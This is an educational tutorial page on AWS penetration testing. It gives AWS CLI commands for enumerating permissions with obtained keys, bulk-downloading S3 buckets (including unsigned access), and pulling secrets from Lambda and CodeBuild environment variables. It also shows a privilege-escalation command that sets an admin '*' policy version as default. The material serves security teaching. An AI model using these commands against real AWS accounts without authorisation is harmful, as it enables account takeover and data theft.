---
title: "AWS Cloud Pentesting"
topic: "aws-pentesting"
tags: [aws, cloud, pentesting, iam, s3, lambda, cloudfront, privilege-escalation]
difficulty: advanced
day: 40
layout: default
parent: Topics
nav_order: 40
---

# AWS Cloud Pentesting

## What You Will Learn
- How to enumerate AWS permissions after obtaining credentials
- How AWS services like S3, Lambda, and CloudFront work
- Common misconfigurations that lead to privilege escalation
- How to enumerate IAM roles and escalate privileges in AWS

## What Is It?

AWS cloud pentesting is the practice of finding vulnerabilities in Amazon Web Services deployments. Cloud environments have unique attack surfaces — misconfigured IAM policies, public S3 buckets, and exposed Lambda functions are common findings.

## Why It Matters

Organizations move infrastructure to the cloud but often misconfigure access controls. A leaked AWS key can give an attacker access to databases, source code, and customer data.

## Key Concepts

### First Steps After Getting AWS Keys

Once AWS keys are obtained, the first step is to understand which privileges they have:
- If you have access to IAM, simply list the privileges for the various roles
- If not, enumerate privileges by testing each service

```bash
# Configure AWS CLI
aws configure

# Check who you are
aws sts get-caller-identity

# If you have IAM access, list your policies
aws iam list-attached-user-policies --user-name <username>
aws iam get-policy-version --policy-arn <arn> --version-id v1

# Enumerate group memberships
aws iam list-groups-for-user --user-name <username>
```

### Enumerate IAM Permissions Without IAM Access

```bash
# Try each service — success means you have permission
aws s3 ls
aws ec2 describe-instances
aws lambda list-functions
aws iam list-users
```

## Storage and Static Hosting

### S3 Buckets

S3 is Amazon's object storage. Misconfigurations can expose sensitive files publicly.

```bash
# List buckets you have access to
aws s3 ls

# List contents of a specific bucket
aws s3 ls s3://bucket-name/

# Download all files from a bucket
aws s3 sync s3://bucket-name/ ./local_copy/

# Check bucket ACL
aws s3api get-bucket-acl --bucket bucket-name

# Check bucket policy
aws s3api get-bucket-policy --bucket bucket-name
```

### Unauthenticated S3 Access

Some buckets are publicly accessible without credentials:

```bash
# Try accessing without credentials
aws s3 ls s3://bucket-name --no-sign-request
```

### AWS CodeBuild

AWS CodeBuild is a fully managed build service. It compiles source code, runs unit tests, and produces deployable artifacts. Misconfigured CodeBuild projects may expose environment variables containing secrets.

```bash
aws codebuild list-projects
aws codebuild batch-get-projects --names <project-name>
```

## Serverless

### Lambda Functions

Lambda runs code without managing servers. Lambda functions may have overly permissive IAM roles or expose sensitive data through environment variables.

```bash
# List Lambda functions
aws lambda list-functions

# Get function details (includes environment variables if accessible)
aws lambda get-function-configuration --function-name <name>

# List environment variables
aws lambda get-function-configuration --function-name <name> \
  --query 'Environment.Variables'
```

### AWS Global Accelerator

AWS Global Accelerator uses edge locations to find the optimal path from users to applications. It improves performance, enhances availability, and simplifies IP address management for global applications.

### AWS CloudFront

Amazon CloudFront is a Content Delivery Network (CDN) like Cloudflare and Akamai. CloudFront delivers static assets (videos, images, files) securely to devices worldwide with low latency by caching them from nearby edge locations.

```bash
# List CloudFront distributions
aws cloudfront list-distributions

# Look for origins pointing to S3 or internal services
aws cloudfront get-distribution --id <dist-id>
```

## Privilege Escalation

```bash
# Check for policies that allow privilege escalation
# (e.g., iam:CreatePolicyVersion, iam:AttachUserPolicy)
aws iam list-attached-user-policies --user-name <user>
aws iam list-user-policies --user-name <user>

# Create new policy version with admin access
aws iam create-policy-version \
  --policy-arn <policy-arn> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

## Resources

- [HackTricks AWS — Cloud Pentesting](https://cloud.hacktricks.xyz/pentesting-cloud/aws-security)
- [Rhino Security — AWS IAM Privilege Escalation Methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [jhaddix — AWS Attack Guide](https://gist.github.com/jhaddix/78cece26c91c6263653f31ba453e273b)
- [SecOps Group — AWS Misconfigurations](https://secops.group/the-anatomy-of-aws-misconfigurations-how-to-stay-safe/)
- [CloudGoat — Vulnerable AWS Environment](https://github.com/RhinoSecurityLabs/cloudgoat)
